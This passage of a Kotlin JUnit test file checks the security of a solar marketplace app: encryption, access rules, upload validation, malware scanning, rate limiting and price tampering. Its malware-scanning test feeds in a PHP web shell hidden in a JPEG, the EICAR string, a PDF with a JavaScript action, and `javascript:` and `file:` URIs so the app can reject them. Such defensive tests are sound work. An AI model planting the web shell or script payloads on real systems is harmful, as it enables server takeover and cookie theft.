        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isEncryptedPayload(encAddr.encryptedStreetAddress))
        org.junit.Assert.assertFalse(encAddr.encryptedStreetAddress.contains(sampleAddr.streetAddress))

        val decAddr = com.example.util.DatabaseEncryptionAndSecurityManager.decryptDeliveryAddressFromDatabase(encAddr)
        assertEquals(sampleAddr.recipientName, decAddr.recipientName)
        assertEquals(sampleAddr.phone, decAddr.phone)
        assertEquals(sampleAddr.streetAddress, decAddr.streetAddress)
    }

    @Test
    fun testProhibitedPaymentDataGuardNeverStoresCardsCvvOrBankingPasswords() {
        // 1. Safe order/payout payload with 10-digit NUBAN bank account and Paystack reference passes
        val safePayoutFields = mapOf(
            "storeId" to "store_nekes",
            "bankName" to "Zenith Bank PLC",
            "bankAccountNumber" to "1019482015",
            "paymentReference" to "SF-PAY-20261104-112233"
        )
        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.validateNoProhibitedPaymentData(safePayoutFields).isSafeToStore)

        // 2. Prohibited field names (cardNumber, cvv, cardPin, bankingPassword, bvn) are strictly rejected
        val prohibitedCardFieldMap = mapOf(
            "customerEmail" to "buyer@solarfix.africa",
            "cardNumber" to "4111111111111111"
        )
        org.junit.Assert.assertFalse(
            "Storing raw cardNumber field must be blocked",
            com.example.util.DatabaseEncryptionAndSecurityManager.validateNoProhibitedPaymentData(prohibitedCardFieldMap).isSafeToStore
        )

        val prohibitedCvvMap = mapOf(
            "paymentReference" to "SF-PAY-123",
            "cvv" to "842"
        )
        org.junit.Assert.assertFalse(
            "Storing CVV field must be blocked",
            com.example.util.DatabaseEncryptionAndSecurityManager.validateNoProhibitedPaymentData(prohibitedCvvMap).isSafeToStore
        )

        val prohibitedBankPassMap = mapOf(
            "storeId" to "store_nekes",
            "bankingPassword" to "MySecretBankLogin123"
        )
        org.junit.Assert.assertFalse(
            "Storing banking password field must be blocked",
            com.example.util.DatabaseEncryptionAndSecurityManager.validateNoProhibitedPaymentData(prohibitedBankPassMap).isSafeToStore
        )

        // 3. Raw Luhn-valid Visa/Mastercard PAN embedded inside a free-text note is detected and blocked
        val embeddedPanInNotes = mapOf(
            "orderNote" to "Please charge my Visa card 4532 0151 1283 0366 for delivery"
        )
        org.junit.Assert.assertFalse(
            "Luhn-valid 16-digit Visa PAN embedded in text must be blocked from database storage",
            com.example.util.DatabaseEncryptionAndSecurityManager.validateNoProhibitedPaymentData(embeddedPanInNotes).isSafeToStore
        )

        // 4. Scrubbing helper redacts PANs and CVVs from logs/notes
        val scrubbed = com.example.util.DatabaseEncryptionAndSecurityManager.scrubProhibitedCardAndBankingSecrets(
            "Card: 4532 0151 1283 0366, CVV: 912, Card PIN: 4321"
        )
        org.junit.Assert.assertFalse(scrubbed.contains("4532 0151 1283 0366"))
        org.junit.Assert.assertFalse(scrubbed.contains("912"))
        assertTrue(scrubbed.contains("[REDACTED_CARD_PAN]"))
        assertTrue(scrubbed.contains("[REDACTED_PAYMENT_SECRET]"))
    }

    @Test
    fun testRowLevelSecurityHttpsEnforcementBackupsAndActivityMonitoring() {
        // 1. HTTPS/TLS 1.2+ transport security enforcement
        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isSecureHttpsEndpoint("https://api.paystack.co/transaction/verify/ref123"))
        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isSecureHttpsEndpoint("https://firestore.googleapis.com/v1/projects/solarfix"))
        org.junit.Assert.assertFalse(
            "Cleartext HTTP must be rejected",
            com.example.util.DatabaseEncryptionAndSecurityManager.isSecureHttpsEndpoint("http://api.paystack.co/transaction")
        )
        org.junit.Assert.assertFalse(
            "Localhost/loopback must be rejected in production transport check",
            com.example.util.DatabaseEncryptionAndSecurityManager.isSecureHttpsEndpoint("https://localhost:8080/api")
        )

        // 2. Row-Level Security (RLS) policy evaluation across collections and roles
        assertTrue(
            "Customer must be allowed to read their own delivery address",
            com.example.util.DatabaseEncryptionAndSecurityManager.evaluateRowLevelAccessPolicy(
                actorUid = "cust_1",
                actorEmail = "cust1@solarfix.africa",
                actorRole = UserRole.CUSTOMER,
                isActorAdmin = false,
                operation = com.example.util.DatabaseOperationType.SELECT_READ,
                collection = "addresses",
                resourceOwnerUid = "cust_1"
            )
        )
        org.junit.Assert.assertFalse(
            "Customer must be blocked from reading another customer's delivery address",
            com.example.util.DatabaseEncryptionAndSecurityManager.evaluateRowLevelAccessPolicy(
                actorUid = "cust_1",
                actorEmail = "cust1@solarfix.africa",
                actorRole = UserRole.CUSTOMER,
                isActorAdmin = false,
                operation = com.example.util.DatabaseOperationType.SELECT_READ,
                collection = "addresses",
                resourceOwnerUid = "cust_2"
            )
        )
        org.junit.Assert.assertFalse(
            "Deleting immutable financial transactions must be blocked for everyone",
            com.example.util.DatabaseEncryptionAndSecurityManager.evaluateRowLevelAccessPolicy(
                actorUid = "admin_uid",
                actorEmail = "admin@solarfix.africa",
                actorRole = UserRole.ADMIN,
                isActorAdmin = true,
                operation = com.example.util.DatabaseOperationType.DELETE_REMOVE,
                collection = "transactions",
                resourceOwnerUid = "admin_uid"
            )
        )

        // 3. Encrypted & HMAC-Signed Database Backups (Admin-only)
        val repo = SolarRepository()
        val backupArchive = repo.createEncryptedDatabaseBackup(adminEmail = "admin@solarfix.africa")
        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isEncryptedPayload(backupArchive.encryptedPayloadCiphertext))
        org.junit.Assert.assertFalse(backupArchive.encryptedPayloadCiphertext.contains("storesCount"))

        val restoredJson = repo.verifyAndRestoreDatabaseBackup(backupArchive, adminEmail = "admin@solarfix.africa")
        assertTrue(restoredJson.contains("\"storesCount\":"))

        // Tampered backup archive must be rejected
        val tamperedBackup = backupArchive.copy(archiveHmacSignature = "tampered_hmac_sig_000")
        var backupTamperBlocked = false
        try {
            repo.verifyAndRestoreDatabaseBackup(tamperedBackup, adminEmail = "admin@solarfix.africa")
        } catch (_: SecurityException) {
            backupTamperBlocked = true
        }
        assertTrue("Tampered database backup archive must fail HMAC verification", backupTamperBlocked)

        // Non-admin attempting database backup must be rejected
        var nonAdminBackupBlocked = false
        try {
            repo.createEncryptedDatabaseBackup(adminEmail = "customer@example.com")
        } catch (_: SecurityException) {
            nonAdminBackupBlocked = true
        }
        assertTrue("Non-admin must be blocked from creating database backups", nonAdminBackupBlocked)

        // 4. Verify Database Activity Monitoring log recorded the operations
        assertTrue("Database activity monitor must record operations", repo.databaseActivityLogsFlow.value.isNotEmpty())
    }

    @Test
    fun testFileUploadValidationAcrossAllSixCategoriesMimeMagicBytesAndSizeLimits() {
        val validJpegBytes = byteArrayOf(
            0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xE0.toByte(),
            0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01
        )
        val validPngBytes = byteArrayOf(
            0x89.toByte(), 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52
        )
        val validWebpBytes = byteArrayOf(
            0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00,
            0x57, 0x45, 0x42, 0x50, 0x56, 0x50, 0x38, 0x20
        )
        val validPdfBytes = "%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF".toByteArray()
        val validMp4Bytes = byteArrayOf(
            0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70,
            0x6D, 0x70, 0x34, 0x32, 0x00, 0x00, 0x00, 0x00
        )
        val validWebmBytes = byteArrayOf(
            0x1A, 0x45, 0xDF.toByte(), 0xA3.toByte(), 0x01, 0x00, 0x00, 0x00,
            0x42, 0x86.toByte(), 0x81.toByte(), 0x01, 0x42, 0xF7.toByte(), 0x81.toByte(), 0x01
        )

        // 1. Category 1: Seller Identity Document (JPEG, PNG, PDF allowed)
        val kycPdfValidation = com.example.util.FileUploadAndStorageSecurityManager.validateAndInspectUpload(
            originalFileName = "nin_slip_scan.pdf",
            declaredMimeType = "application/pdf",
            fileBytes = validPdfBytes,
            category = com.example.util.UploadFileCategory.SELLER_IDENTITY_DOCUMENT
        )
        assertTrue("Valid PDF NIN document must pass validation", kycPdfValidation.isValid)
        assertEquals("application/pdf", kycPdfValidation.detectedMimeType)
        assertTrue(kycPdfValidation.secureStorageFileName!!.startsWith("sf_kyc_id_"))
        assertTrue(kycPdfValidation.secureStorageFileName!!.endsWith(".pdf"))
        org.junit.Assert.assertFalse("Secure filename must not preserve user filename", kycPdfValidation.secureStorageFileName!!.contains("nin_slip"))

        // 2. Category 2: Business Verification Photograph (Premises JPEG/PNG/WEBP)
        val premisesJpegValidation = com.example.util.FileUploadAndStorageSecurityManager.validateAndInspectUpload(
            originalFileName = "ikeja_warehouse_front.jpg",
            declaredMimeType = "image/jpeg",
            fileBytes = validJpegBytes,
            category = com.example.util.UploadFileCategory.BUSINESS_VERIFICATION_PHOTO
        )
        assertTrue(premisesJpegValidation.isValid)
        assertTrue(premisesJpegValidation.isolatedStoragePath!!.startsWith("private-vault/business-premises/"))

        // 3. Category 3: Product Photograph (PNG & WEBP)
        val prodPhotoValidation = com.example.util.FileUploadAndStorageSecurityManager.validateAndInspectUpload(
            originalFileName = "deye_8kw_inverter.webp",
            declaredMimeType = "image/webp",
            fileBytes = validWebpBytes,
            category = com.example.util.UploadFileCategory.PRODUCT_PHOTOGRAPH
        )
        assertTrue(prodPhotoValidation.isValid)
        assertTrue(prodPhotoValidation.isolatedStoragePath!!.startsWith("public-media/products/photos/"))

        // 4. Category 4: Product Video (MP4 & WEBM)
        val prodVideoMp4Validation = com.example.util.FileUploadAndStorageSecurityManager.validateAndInspectUpload(
            originalFileName = "load_bank_test.mp4",
            declaredMimeType = "video/mp4",
            fileBytes = validMp4Bytes,
            category = com.example.util.UploadFileCategory.PRODUCT_VIDEO
        )
        assertTrue(prodVideoMp4Validation.isValid)
        assertEquals("video/mp4", prodVideoMp4Validation.detectedMimeType)

        val prodVideoWebmValidation = com.example.util.FileUploadAndStorageSecurityManager.validateAndInspectUpload(
            originalFileName = "serial_plate_360.webm",
            declaredMimeType = "video/webm",
            fileBytes = validWebmBytes,
            category = com.example.util.UploadFileCategory.PRODUCT_VIDEO
        )
        assertTrue(prodVideoWebmValidation.isValid)

        // 5. Category 5: Profile Photograph (5 MB limit)
        val profilePngValidation = com.example.util.FileUploadAndStorageSecurityManager.validateAndInspectUpload(
            originalFileName = "store_logo.png",
            declaredMimeType = "image/png",
            fileBytes = validPngBytes,
            category = com.example.util.UploadFileCategory.PROFILE_PHOTOGRAPH
        )
        assertTrue(profilePngValidation.isValid)

        // 6. Category 6: Other Verification Document (SONCAP / OEM Invoice PDF)
        val soncapPdfValidation = com.example.util.FileUploadAndStorageSecurityManager.validateAndInspectUpload(
            originalFileName = "soncap_certificate_2026.pdf",
            declaredMimeType = "application/pdf",
            fileBytes = validPdfBytes,
            category = com.example.util.UploadFileCategory.OTHER_VERIFICATION_DOCUMENT
        )
        assertTrue(soncapPdfValidation.isValid)
        assertTrue(soncapPdfValidation.isolatedStoragePath!!.startsWith("private-vault/compliance-docs/"))

        // 7. Reject MIME Spoofing (declaring image/jpeg for a PDF binary)
        val spoofedMime = com.example.util.FileUploadAndStorageSecurityManager.validateAndInspectUpload(
            originalFileName = "spoofed_photo.jpg",
            declaredMimeType = "image/jpeg",
            fileBytes = validPdfBytes,
            category = com.example.util.UploadFileCategory.PRODUCT_PHOTOGRAPH
        )
        org.junit.Assert.assertFalse("MIME spoofing (PDF bytes with image/jpeg header) must be rejected", spoofedMime.isValid)

        // 8. Reject Extension Spoofing (declaring .jpg filename with application/pdf MIME and PDF bytes)
        val spoofedExtension = com.example.util.FileUploadAndStorageSecurityManager.validateAndInspectUpload(
            originalFileName = "disguised.jpg",
            declaredMimeType = "application/pdf",
            fileBytes = validPdfBytes,
            category = com.example.util.UploadFileCategory.SELLER_IDENTITY_DOCUMENT
        )
        org.junit.Assert.assertFalse("Extension spoofing (.jpg filename with PDF content) must be rejected", spoofedExtension.isValid)

        // 9. Reject Oversized Profile Photo (> 5 MB)
        val oversizedProfileBytes = ByteArray(5 * 1024 * 1024 + 1024)
        System.arraycopy(validJpegBytes, 0, oversizedProfileBytes, 0, validJpegBytes.size)
        val oversizedResult = com.example.util.FileUploadAndStorageSecurityManager.validateAndInspectUpload(
            originalFileName = "huge_avatar.jpg",
            declaredMimeType = "image/jpeg",
            fileBytes = oversizedProfileBytes,
            category = com.example.util.UploadFileCategory.PROFILE_PHOTOGRAPH
        )
        org.junit.Assert.assertFalse("Profile photograph exceeding 5 MB limit must be rejected", oversizedResult.isValid)
    }

    @Test
    fun testMalwarePolyglotWebShellAndActivePdfScanning() {
        val validJpegHeader = byteArrayOf(
            0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xE0.toByte(),
            0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01
        )

        // 1. EICAR Standard Antivirus Test File embedded in payload must be blocked
        val eicarBytes = validJpegHeader + "X5O!P%@AP[4\\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*".toByteArray()
        val eicarScan = com.example.util.FileUploadAndStorageSecurityManager.scanBytesForMalware(eicarBytes, "image/jpeg")
        org.junit.Assert.assertFalse("EICAR test virus signature must be flagged as infected", eicarScan.isClean)
        assertEquals(com.example.util.MalwareScanStatus.INFECTED_SIGNATURE_DETECTED, eicarScan.status)

        // 2. Polyglot JPEG + PHP Web Shell (`FF D8 FF E0 ... <?php system($_GET['cmd']); ?>`) must be blocked
        val polyglotJpegPhp = validJpegHeader + "<?php system(\$_GET['cmd']); ?>".toByteArray()
        val polyglotValidation = com.example.util.FileUploadAndStorageSecurityManager.validateAndInspectUpload(
            originalFileName = "inverter_photo.jpg",
            declaredMimeType = "image/jpeg",
            fileBytes = polyglotJpegPhp,
            category = com.example.util.UploadFileCategory.PRODUCT_PHOTOGRAPH
        )
        org.junit.Assert.assertFalse("Polyglot JPEG containing embedded PHP web-shell must be rejected", polyglotValidation.isValid)

        // 3. Malicious PDF containing active `/JavaScript` or `/Launch` action must be blocked
        val maliciousPdfBytes = "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert('XSS')) >> >>\n%%EOF".toByteArray()
        val maliciousPdfValidation = com.example.util.FileUploadAndStorageSecurityManager.validateAndInspectUpload(
            originalFileName = "kyc_document.pdf",
            declaredMimeType = "application/pdf",
            fileBytes = maliciousPdfBytes,
            category = com.example.util.UploadFileCategory.SELLER_IDENTITY_DOCUMENT
        )
        org.junit.Assert.assertFalse("PDF document with embedded /JavaScript action must be rejected", maliciousPdfValidation.isValid)
        assertEquals(
            com.example.util.MalwareScanStatus.ACTIVE_PDF_PAYLOAD_DETECTED,
            maliciousPdfValidation.malwareScanResult?.status
        )

        // 4. Executable ELF / PE / DEX / APK binary headers must be blocked
        val elfBinary = byteArrayOf(0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
        org.junit.Assert.assertFalse(com.example.util.FileUploadAndStorageSecurityManager.scanBytesForMalware(elfBinary, null).isClean)

        val dexBinary = "dex\n035\u000012345678".toByteArray()
        org.junit.Assert.assertFalse(com.example.util.FileUploadAndStorageSecurityManager.scanBytesForMalware(dexBinary, null).isClean)

        // 5. Product Video URI Sanitization blocks javascript:, file:, data:, and cleartext http: schemes
        assertNull(com.example.util.FileUploadAndStorageSecurityManager.validateAndSanitizeProductVideoReference("javascript:alert(document.cookie)"))
        assertNull(com.example.util.FileUploadAndStorageSecurityManager.validateAndSanitizeProductVideoReference("file:///data/data/com.example/databases/solar.db"))
        assertNull(com.example.util.FileUploadAndStorageSecurityManager.validateAndSanitizeProductVideoReference("http://insecure.example.com/video.mp4"))
        assertEquals(
            "solarfix://video/deye-12kw-load-test",
            com.example.util.FileUploadAndStorageSecurityManager.validateAndSanitizeProductVideoReference("solarfix://video/deye-12kw-load-test")
        )
    }

    @Test
    fun testPrivateVerificationVaultIsolationAndAdminOnlyAccessEnforcement() {
        val repo = SolarRepository()
        val validPngBytes = byteArrayOf(
            0x89.toByte(), 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, 0x01, 0x02, 0x03, 0x04
        )
        val validPdfBytes = "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n%%EOF".toByteArray()

        // 1. Upload a Public Product Photograph -> Stored in PUBLIC_CATALOG_MEDIA
        val publicPhotoRecord = repo.uploadFileToSecureStorage(
            originalFileName = "felicity_lithium_pack.png",
            declaredMimeType = "image/png",
            fileBytes = validPngBytes,
            category = com.example.util.UploadFileCategory.PRODUCT_PHOTOGRAPH,
            ownerUid = "seller_uid_nekes_01",
            ownerStoreId = "store_nekes",
            uploaderEmail = "nekeskingsley@gmail.com"
        ).getOrThrow()

        assertEquals(com.example.util.StoragePartition.PUBLIC_CATALOG_MEDIA, publicPhotoRecord.partition)
        assertTrue("Public product photograph must be publicly accessible", publicPhotoRecord.isPubliclyAccessible)
        assertTrue(publicPhotoRecord.isolatedStoragePath.startsWith("public-media/products/photos/store_nekes/"))
        org.junit.Assert.assertNotNull(
            "Public media lookup must succeed for product photograph",
            com.example.util.FileUploadAndStorageSecurityManager.getPublicMediaFile(publicPhotoRecord.fileId)
        )

        // 2. Upload a Seller Identity Document -> Stored in PRIVATE_ADMIN_VAULT (Encrypted at rest, NEVER public)
        val privateKycRecord = repo.uploadFileToSecureStorage(
            originalFileName = "seller_national_id_nin.pdf",
            declaredMimeType = "application/pdf",
            fileBytes = validPdfBytes,
            category = com.example.util.UploadFileCategory.SELLER_IDENTITY_DOCUMENT,
            ownerUid = "seller_uid_nekes_01",
            ownerStoreId = "store_nekes",
            uploaderEmail = "nekeskingsley@gmail.com"
        ).getOrThrow()

        assertEquals(com.example.util.StoragePartition.PRIVATE_ADMIN_VAULT, privateKycRecord.partition)
        assertEquals(com.example.util.FileAccessLevel.PRIVATE_ADMIN_ONLY, privateKycRecord.accessLevel)
        org.junit.Assert.assertFalse("Seller identity document must NEVER be publicly accessible", privateKycRecord.isPubliclyAccessible)
        assertTrue("Private KYC document must be encrypted at rest with AES-256-GCM", privateKycRecord.isEncryptedAtRest)
        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isEncryptedPayload(privateKycRecord.encryptedPayloadOrReference))
        assertTrue(privateKycRecord.isolatedStoragePath.startsWith("private-vault/kyc-identity-docs/store_nekes/"))
        assertTrue(privateKycRecord.posixPermissions.startsWith("0600"))

        // 3. Attempting to fetch the Seller Identity Document through the public media endpoint must return null
        val publicAttemptOnKyc = com.example.util.FileUploadAndStorageSecurityManager.getPublicMediaFile(
            fileId = privateKycRecord.fileId,
            callerEmail = "anonymous_visitor@example.com"
        )
        assertNull("Public media endpoint must never return a private seller identity document", publicAttemptOnKyc)

        // 4. Public media listing for store_nekes must exclude all private verification documents
        val publicStoreMedia = com.example.util.FileUploadAndStorageSecurityManager.listPublicMediaForOwner("store_nekes")
        assertTrue(publicStoreMedia.any { it.fileId == publicPhotoRecord.fileId })
        org.junit.Assert.assertFalse(
            "Public store media list must never include private KYC documents",
            publicStoreMedia.any { it.fileId == privateKycRecord.fileId }
        )

        // 5. Customer and non-admin Seller attempting to access private verification document must be blocked
        var customerBlocked = false
        try {
            repo.accessPrivateVerificationDocumentForAdmin(
                fileId = privateKycRecord.fileId,
                adminEmail = "customer@example.com",
                adminRole = UserRole.CUSTOMER
            )
        } catch (_: SecurityException) {
            customerBlocked = true
        }
        assertTrue("Customer must be blocked from accessing private seller identity documents", customerBlocked)

        var otherSellerBlocked = false
        try {
            repo.accessPrivateVerificationDocumentForAdmin(
                fileId = privateKycRecord.fileId,
                adminEmail = "seller.felicity@example.com",
                adminRole = UserRole.VERIFIED_SELLER
            )
        } catch (_: SecurityException) {
            otherSellerBlocked = true
        }
        assertTrue("Non-admin seller must be blocked from accessing private verification vault", otherSellerBlocked)

        // 6. Authorized Platform Administrator can access and decrypt the private verification document
        val (decryptedMeta, decryptedBytes) = repo.accessPrivateVerificationDocumentForAdmin(
            fileId = privateKycRecord.fileId,
            adminEmail = "admin@solarfix.africa",
            adminRole = UserRole.ADMIN
        )
        assertEquals(privateKycRecord.fileId, decryptedMeta.fileId)
        org.junit.Assert.assertArrayEquals("Decrypted bytes must match original PDF bytes", validPdfBytes, decryptedBytes)

        // 7. Verify File Storage Audit Log recorded all uploads, blocked attempts, and admin decryptions
        assertTrue(repo.fileStorageAuditLogsFlow.value.any { it.action == "PUBLIC_ACCESS_TO_PRIVATE_DOC_BLOCKED" })
        assertTrue(repo.fileStorageAuditLogsFlow.value.any { it.action == "UNAUTHORIZED_PRIVATE_VAULT_ACCESS_BLOCKED" })
        assertTrue(repo.fileStorageAuditLogsFlow.value.any { it.action == "ADMIN_PRIVATE_DOC_DECRYPTED_VIEW" })
    }

    @Test
    fun testServerSideRateLimitingAcrossAllElevenEndpointsAndAntiBypass() {
        com.example.util.RateLimitingAndFinancialSecurityManager.resetAllRateLimitsForTesting()
        try {
            // 1. Verify all 11 protected endpoints enforce their rate limits and temporary restrictions
            for (endpoint in com.example.util.ProtectedEndpoint.values()) {
                com.example.util.RateLimitingAndFinancialSecurityManager.resetAllRateLimitsForTesting()
                val actor = "user_${endpoint.name.lowercase()}@solarfix.africa"
                val devId = "dev_${endpoint.name.lowercase()}_01"
                val ip = "102.89.32.10"

                repeat(endpoint.maxRequestsPerWindow) { idx ->
                    val decision = com.example.util.RateLimitingAndFinancialSecurityManager.checkAndRecordRequest(
                        endpoint = endpoint,
                        accountIdentifier = actor,
                        deviceFingerprint = devId,
                        ipAddress = ip
                    )
                    assertTrue(
                        "Request #${idx + 1} for ${endpoint.name} must be allowed within quota (${endpoint.maxRequestsPerWindow})",
                        decision.allowed
                    )
                    if (idx >= endpoint.captchaThresholdRequests) {
                        assertTrue(
                            "Requests at or above captchaThresholdRequests for ${endpoint.name} must flag requiresCaptcha",
                            decision.requiresCaptcha
                        )
                    }
                }

                // Next request beyond maxRequestsPerWindow must be blocked and trigger temporary restriction
                val blockedDecision = com.example.util.RateLimitingAndFinancialSecurityManager.checkAndRecordRequest(
                    endpoint = endpoint,
                    accountIdentifier = actor,
                    deviceFingerprint = devId,
                    ipAddress = ip
                )
                org.junit.Assert.assertFalse(
                    "Request exceeding maxRequestsPerWindow (${endpoint.maxRequestsPerWindow}) on ${endpoint.name} must be blocked",
                    blockedDecision.allowed
                )
                assertTrue(blockedDecision.temporaryAccountRestricted)
                assertTrue(blockedDecision.requiresCaptcha)
                org.junit.Assert.assertNotNull(blockedDecision.captchaChallengeId)
            }

            // 2. Anti-Bypass Test A: Changing IP addresses on the same device CANNOT bypass rate limiting
            com.example.util.RateLimitingAndFinancialSecurityManager.resetAllRateLimitsForTesting()
            val fixedDevice = "dev_attacker_pixel8_998877"
            val rotatingIps = listOf(
                "102.89.10.5",
                "197.210.44.12",
                "41.58.100.88",
                "105.112.22.91",
                "154.118.60.14"
            )
            rotatingIps.forEach { ipAddr ->
                val d = com.example.util.RateLimitingAndFinancialSecurityManager.checkAndRecordRequest(
                    endpoint = com.example.util.ProtectedEndpoint.LOGIN,
                    accountIdentifier = "victim@solarfix.africa",
                    deviceFingerprint = fixedDevice,
                    ipAddress = ipAddr
                )
                assertTrue(d.allowed)
            }
            // 6th attempt from a brand-new IP address AND a different account on the same device must be blocked by DEVICE_FINGERPRINT
            val ipHopBypassAttempt = com.example.util.RateLimitingAndFinancialSecurityManager.checkAndRecordRequest(
                endpoint = com.example.util.ProtectedEndpoint.LOGIN,
                accountIdentifier = "another_account@solarfix.africa",
                deviceFingerprint = fixedDevice,
                ipAddress = "129.205.11.77"
            )
            org.junit.Assert.assertFalse(
                "Changing IP address and account on the same hardware device must NOT bypass rate limiting",
                ipHopBypassAttempt.allowed
            )
            assertEquals("DEVICE_FINGERPRINT", ipHopBypassAttempt.blockingDimension)

            // 3. Anti-Bypass Test B: Repeatedly creating new accounts from the same /24 IP subnet CANNOT bypass REGISTRATION rate limit
            com.example.util.RateLimitingAndFinancialSecurityManager.resetAllRateLimitsForTesting()
            // Registration allows max 3 per 10 mins. Attacker uses 3 different devices & 3 different accounts in the same /24 subnet:
            assertTrue(
                com.example.util.RateLimitingAndFinancialSecurityManager.checkAndRecordRequest(
                    endpoint = com.example.util.ProtectedEndpoint.REGISTRATION,
                    accountIdentifier = "sybil_bot_1@evil.com",
                    deviceFingerprint = "dev_emu_1",
                    ipAddress = "197.210.70.11"
                ).allowed
            )
            assertTrue(
                com.example.util.RateLimitingAndFinancialSecurityManager.checkAndRecordRequest(
                    endpoint = com.example.util.ProtectedEndpoint.REGISTRATION,
                    accountIdentifier = "sybil_bot_2@evil.com",
                    deviceFingerprint = "dev_emu_2",
                    ipAddress = "197.210.70.55"
                ).allowed
            )
            assertTrue(
                com.example.util.RateLimitingAndFinancialSecurityManager.checkAndRecordRequest(
                    endpoint = com.example.util.ProtectedEndpoint.REGISTRATION,
                    accountIdentifier = "sybil_bot_3@evil.com",
                    deviceFingerprint = "dev_emu_3",
                    ipAddress = "197.210.70.99"
                ).allowed
            )
            // 4th account creation from another IP in the same 197.210.70.0/24 subnet and new device is blocked by IP_SUBNET
            val sybilSubnetAttempt = com.example.util.RateLimitingAndFinancialSecurityManager.checkAndRecordRequest(
                endpoint = com.example.util.ProtectedEndpoint.REGISTRATION,
                accountIdentifier = "sybil_bot_4@evil.com",
                deviceFingerprint = "dev_emu_4",
                ipAddress = "197.210.70.200"
            )
            org.junit.Assert.assertFalse(
                "Repeatedly creating accounts across IPs in the same /24 subnet must be blocked",
                sybilSubnetAttempt.allowed
            )
            assertEquals("IP_SUBNET", sybilSubnetAttempt.blockingDimension)

            // 4. Verify CAPTCHA Challenge Issuance & Verification lifts temporary restriction
            val (challenge, expectedAnswer) = com.example.util.RateLimitingAndFinancialSecurityManager.issueCaptchaChallenge(
                endpoint = com.example.util.ProtectedEndpoint.PAYMENT_INITIALIZATION,
                actorIdentifier = "buyer@solarfix.africa"
            )
            val wrongCaptcha = com.example.util.RateLimitingAndFinancialSecurityManager.verifyCaptchaChallenge(
                challengeId = challenge.challengeId,
                userAnswer = "999999"
            )
            assertTrue("Wrong CAPTCHA answer must fail verification", wrongCaptcha.isFailure)

            val rightCaptcha = com.example.util.RateLimitingAndFinancialSecurityManager.verifyCaptchaChallenge(
                challengeId = challenge.challengeId,
                userAnswer = expectedAnswer
            )
            assertTrue("Correct CAPTCHA answer must succeed and return a grant token", rightCaptcha.isSuccess)
            assertTrue(rightCaptcha.getOrThrow().startsWith("CAP-GRANT-"))

            // 5. Verify Suspicious Activity Monitoring feed recorded the abuse events
            assertTrue(
                "Abuse monitoring feed must record rate-limit violations",
                com.example.util.RateLimitingAndFinancialSecurityManager.abuseEventsFlow.value.isNotEmpty()
            )
        } finally {
            com.example.util.RateLimitingAndFinancialSecurityManager.resetAllRateLimitsForTesting()
        }
    }

    @Test
    fun testMarketplaceFinancialSecurityBackendRecalculationAndAntiManipulation() {
        com.example.util.RateLimitingAndFinancialSecurityManager.resetAllRateLimitsForTesting()
        val repo = SolarRepository()
        val sampleProduct = repo.products.first { it.storeId == "store_nekes" }
        val trueUnitPrice = sampleProduct.basePriceNgn // e.g., ₦1,680,000

        // 1. Requirement 7 & 8: Never trust frontend payment amounts; always recalculate on backend
        val tamperedFrontendClaim = listOf(
            com.example.util.ClientOrderItemClaim(
                productId = sampleProduct.id,
                quantity = 2,
                clientClaimedUnitPriceNgn = 500L // Attacker claims ₦500 instead of ₦1,680,000!
            )
        )
        val recalcSummary = repo.recalculateOrderTotalOnBackend(
            requestedItems = tamperedFrontendClaim,
            frontendClaimedTotalNgn = 1_000L // Attacker claims ₦1,000 total!
        )
        assertTrue(
            "Backend must detect frontend price manipulation",
            recalcSummary.frontendPriceTamperingDetected
        )
        org.junit.Assert.assertFalse("Tampered frontend claim must be marked invalid", recalcSummary.isValid)
        assertEquals(
            "Backend must still compute authoritative subtotal from live catalog price",
            trueUnitPrice * 2L,
            recalcSummary.authoritativeSubtotalNgn
        )
        assertEquals(
            "Backend authoritative final total must include catalog subtotal + ₦15,000 delivery",
            (trueUnitPrice * 2L) + 15_000L,
            recalcSummary.authoritativeFinalTotalNgn
        )

        // 2. Honest frontend calculation matches backend recalculation
        val honestClaim = listOf(
            com.example.util.ClientOrderItemClaim(
                productId = sampleProduct.id,
                quantity = 1,
                clientClaimedUnitPriceNgn = trueUnitPrice
            )
        )
        val honestSummary = repo.recalculateOrderTotalOnBackend(
            requestedItems = honestClaim,
            frontendClaimedTotalNgn = trueUnitPrice + 15_000L
        )
        assertTrue(honestSummary.isValid)
        org.junit.Assert.assertFalse(honestSummary.frontendPriceTamperingDetected)

        // 3. Requirement 5: Prevent duplicate commission deductions
        val testOrderId = "ORD-FIN-SEC-TEST-9001"
        val firstCommDeduction = com.example.util.RateLimitingAndFinancialSecurityManager.tryRegisterUniqueCommissionDeduction(
            orderId = testOrderId,
            storeId = "store_nekes",
            commissionNgn = 33_600L,
            netSellerEarningsNgn = 1_646_400L
        )
        assertTrue("First commission deduction for an order must succeed", firstCommDeduction)

        val duplicateCommDeduction = com.example.util.RateLimitingAndFinancialSecurityManager.tryRegisterUniqueCommissionDeduction(
            orderId = testOrderId,
            storeId = "store_nekes",
            commissionNgn = 33_600L,
            netSellerEarningsNgn = 1_646_400L
        )
        org.junit.Assert.assertFalse(
